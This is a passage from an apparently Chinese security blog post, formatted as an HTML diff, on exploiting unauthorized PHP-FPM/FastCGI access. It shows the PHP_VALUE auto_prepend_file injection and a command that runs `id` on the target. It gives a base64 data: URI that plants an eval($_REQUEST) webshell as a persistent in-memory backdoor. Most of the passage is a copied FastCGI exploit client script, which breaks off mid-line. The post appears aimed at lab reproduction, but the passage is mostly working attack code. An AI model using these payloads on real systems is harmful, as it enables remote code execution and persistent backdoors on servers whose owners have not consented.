+<h4 id="FastCGI未授权访问"><a href="#FastCGI未授权访问" class="headerlink" title="FastCGI未授权访问"></a>FastCGI未授权访问</h4><p><strong>那么，如果我们能够控制<code>FastCGI</code>的通信协议，是否可以执行任意代码呢？</strong></p>
+<p>理论上当然是不可以的，但是在PHP的配置中有两个特殊的配置项可以帮我们实现这一点：<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p>
+<ul>
+<li><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；</li>
+<li><code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</li>
+</ul>
+<p>如果我们设置<code>auto_prepend_file</code>为<code>php://input</code>（只要Content-Type不为<code>multipart/form-data</code>， <code>php://input</code>会填入post数据，详见<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.input">官方文档</a>），那么就等于在执行任何<code>php</code>文件前都要包含一遍<code>POST</code>的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。当然，还需要开启远程文件包含选项<code>allow_url_include</code>。</p>
+<p><strong>那么，我们如何设置<code>auto-prepend_file</code>的呢?</strong></p>
+<p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
+<p>所以，我们最后传入如下环境变量：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;<span class="hljs-punctuation">:</span> &#x27;FastCGI/1.0&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_METHOD&#x27;<span class="hljs-punctuation">:</span> &#x27;GET&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_FILENAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_NAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;QUERY_STRING&#x27;<span class="hljs-punctuation">:</span> &#x27;?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_URI&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;DOCUMENT_ROOT&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_SOFTWARE&#x27;<span class="hljs-punctuation">:</span> &#x27;php/fcgiclient&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1234</span>5&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;80&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_NAME&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PROTOCOL&#x27;<span class="hljs-punctuation">:</span> &#x27;HTTP/1.1&#x27;<br>    &#x27;PHP_VALUE&#x27;<span class="hljs-punctuation">:</span> &#x27;auto_prepend_file = php://input&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;PHP_ADMIN_VALUE&#x27;<span class="hljs-punctuation">:</span> &#x27;allow_url_include = On&#x27;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>漏洞复现</strong></p>
+<p>复现环境可以使用vulhub的CVE-2019-11043复现环境。</p>
+<p>Exp见p神的代码 <a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75%E3%80%82">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75。</a></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python php_fpm.py 127.0.0.1 /usr/local/lib/php/PEAR.php -c &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `id`;<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/8e38a1bd0e71442e8fae9d6b325629a1.png" srcset="/img/loading.gif" lazyload alt="image-20230227212846684"></p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例</a></p>
+<h3 id="利用PHP-FPM做内存马"><a href="#利用PHP-FPM做内存马" class="headerlink" title="利用PHP-FPM做内存马"></a>利用PHP-FPM做内存马</h3><p>上个章节介绍了接近内存马的PHP不死马以及利用<code>FastCGI</code>制作的木马，但是这两种木马都不符合内存马的基本特性—-<strong>PHP 代码无法长久驻留内存执行</strong>，接下来我们对<code>FastCGI</code>马进行下相应的改进使其称为真正意义上的内存马。</p>
+<p>​		在<code>FastCGI</code>马中，我们使用<code>PHP_VALUE</code>设置<code>auto_prepend_file = php://input</code>从而使得http请求传入的数据得到执行，那么有没有方法使得后门代码在内存中驻留呢？*<em>我们只需要将<code>php://input</code>协议换为<code>data</code>就可以了</em>（base64的内容为<code>&lt;?php @eval($_REQUEST[test]); ?&gt;</code>）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file = php://input&#x27;</span>,<br> <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file =\&#x27;</span>data:;<span class="hljs-built_in">base64</span>,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\&#x27;<span class="hljs-string">&#x27;,</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong>用P神的代码修改一下即可。</p>
+<p>P神的脚本：<a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<p>源码备份：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        <span class="hljs-variable language_">self</span>.host = host<br>        <span class="hljs-variable language_">self</span>.port = port<br>        <span class="hljs-variable language_">self</span>.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        <span class="hljs-variable language_">self</span>.sock.settimeout(<span class="hljs-variable language_">self</span>.timeout)<br>        <span class="hljs-variable language_">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br>        <span class="hljs-keyword">try</span>:<br><br>            <span class="hljs-variable language_">self</span>.sock.connect((<span class="hljs-variable language_">self</span>.host, <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.port)))<br><br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            <span class="hljs-variable language_">self</span>.sock.close()<br>            <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>            + bchr(fcgi_type) \<br>            + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr(<span class="hljs-number">0</span>) \<br>            + bchr(<span class="hljs-number">0</span>) \<br>            + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = <span class="hljs-variable language_">self</span>.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        <span class="hljs-variable language_">self</span>.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>            + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>            + bchr(<span class="hljs-variable language_">self</span>.keepalive) \<br>            + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += <span class="hljs-variable language_">self</span>.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>                FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>            FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>                FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>            FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-variable language_">self</span>.sock.send(request)<br>        <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.__waitForResponse(requestId)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = <span class="hljs-variable language_">self</span>.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = <span class="hljs-variable language_">self</span>.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    <span class="hljs-variable language_">self</span>.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                <span class="hljs-variable language_">self</span>.requests[requestId]<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.host, <span class="hljs-variable language_">self</span>.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span 